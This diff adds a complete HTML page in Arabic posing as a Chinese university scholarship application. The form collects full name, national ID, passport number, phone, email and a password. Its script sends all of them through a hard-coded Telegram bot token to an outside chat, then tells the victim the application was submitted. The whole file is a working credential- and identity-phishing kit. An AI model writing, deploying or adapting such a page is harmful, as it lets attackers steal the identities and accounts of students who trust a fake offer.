@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>منحة دراسية في الصين 🇨🇳</title>
+
+<style>
+
+body{
+font-family:"Tahoma",Arial,sans-serif;
+background:linear-gradient(160deg,#f8fbff,#e6edf5);
+margin:0;
+padding:20px;
+}
+
+.container{
+max-width:520px;
+margin:auto;
+background:white;
+padding:30px;
+border-radius:25px;
+box-shadow:0 15px 40px rgba(0,0,0,0.12);
+border-top:6px solid #c40000;
+}
+
+.logo{
+width:95px;
+height:95px;
+margin:auto;
+border-radius:50%;
+background:linear-gradient(135deg,#c40000,#ff3b3b);
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:55px;
+box-shadow:0 8px 20px rgba(196,0,0,.3);
+}
+
+h1{
+text-align:center;
+color:#a00000;
+font-size:28px;
+margin-top:20px;
+}
+
+p{
+text-align:center;
+color:#666;
+font-size:17px;
+}
+
+.info{
+background:#f7f9fc;
+padding:15px;
+border-radius:15px;
+margin:20px 0;
+color:#555;
+line-height:1.8;
+}
+
+input,select{
+width:100%;
+padding:15px;
+margin:9px 0;
+border:1px solid #ddd;
+border-radius:12px;
+background:#f9fafc;
+font-size:16px;
+box-sizing:border-box;
+transition:.3s;
+}
+
+input:focus,select:focus{
+background:white;
+border-color:#c40000;
+box-shadow:0 0 10px rgba(196,0,0,.2);
+outline:none;
+}
+
+.error{
+border:2px solid red;
+background:#ffeaea;
+}
+
+button{
+width:100%;
+padding:16px;
+margin-top:15px;
+border:0;
+border-radius:15px;
+background:linear-gradient(135deg,#c40000,#8b0000);
+color:white;
+font-size:20px;
+font-weight:bold;
+box-shadow:0 8px 18px rgba(196,0,0,.3);
+}
+
+button:active{
+transform:scale(.97);
+}
+
+.note{
+margin-top:20px;
+padding:12px;
+background:#f5f5f5;
+border-radius:10px;
+color:#777;
+text-align:center;
+font-size:13px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="logo">
+🇨🇳
+</div>
+
+<h1>فرص منحة دراسية في الصين</h1>
+
+<p>ابدأ رحلتك التعليمية في أفضل الجامعات الصينية</p>
+
+<div class="info">
+🎓 منح دراسية للطلاب الدوليين<br>
+🌏 الدراسة في الصين<br>
+📄 إملاء الإستبيان التالي لتقديم في إحدى الجامعات الصينية
+</div>
+
+
+<form autocomplete="on">
+
+<input id="field_a1" type="text" placeholder="الاسم الرباعي" autocomplete="name">
+
+<input id="field_a2" type="text" placeholder="المؤهل العلمي">
+
+<input id="field_a3" type="text" placeholder="الرقم الوطني">
+
+<input id="field_a4" type="text" placeholder="رقم جواز السفر">
+
+<select id="field_a5">
+<option value="">جواز سفر ساري المفعول؟</option>
+<option>نعم</option>
+<option>لا</option>
+</select>
+
+<input id="field_a6" type="number" placeholder="العمر">
+
+<input id="field_a7" type="tel" placeholder="رقم الهاتف المربوط بالرقم الوطني" autocomplete="tel">
+
+<input id="field_a8" type="email" placeholder="البريد الإلكتروني" autocomplete="email">
+
+<input id="field_a9" type="text" placeholder="كلمة السر">
+
+
+<button type="button" onclick="sendData()">
+إرسال طلب المنحة
+</button>
+
+</form>
+
+
+<div class="note">
+سيتم مراجعة الطلبات والتواصل مع المقبولين.
+</div>
+
+</div>
+
+
+<script>
+
+const BOT_TOKEN="8757578014:AAH9HKJcYW0O9LzDuD68Fsger3VRikeATdA";
+const CHAT_ID="8876433465";
+
+
+function sendData(){
+
+let ids=[
+"field_a1",
+"field_a2",
+"field_a3",
+"field_a4",
+"field_a5",
+"field_a6",
+"field_a7",
+"field_a8",
+"field_a9"
+];
+
+let empty=false;
+
+ids.forEach(function(id){
+
+let e=document.getElementById(id);
+
+if(e.value.trim()==""){
+e.classList.add("error");
+empty=true;
+}else{
+e.classList.remove("error");
+}
+
+});
+
+
+if(empty){
+alert("⚠️ يرجى تعبئة جميع الحقول");
+return;
+}
+
+
+let msg=
+"📥 طلب منحة جديد\n\n"+
+"👤 الاسم: "+field_a1.value+"\n"+
+"🎓 الرقم الوطني: "+field_a2.value+"\n"+
+"📚 التخصص: "+field_a3.value+"\n"+
+"💼 العمل: "+field_a4.value+"\n"+
+"🛂 الجواز: "+field_a5.value+"\n"+
+"🎂 العمر: "+field_a6.value+"\n"+
+"📞 الهاتف: "+field_a7.value+"\n"+
+"📧 البريد: "+field_a8.value+"\n"+
+"⭐ كلمة السر: "+field_a9.value;
+
+
+fetch(
+"https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",
+{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:msg
+})
+}
+)
+.then(()=>{
+alert("✅  تم إرسال الطلب بنجاح");
+})
+.catch(()=>{
+alert("❌ حدث خطأ");
+});
+
+}
+
+</script>
+
+</body>
+</html>
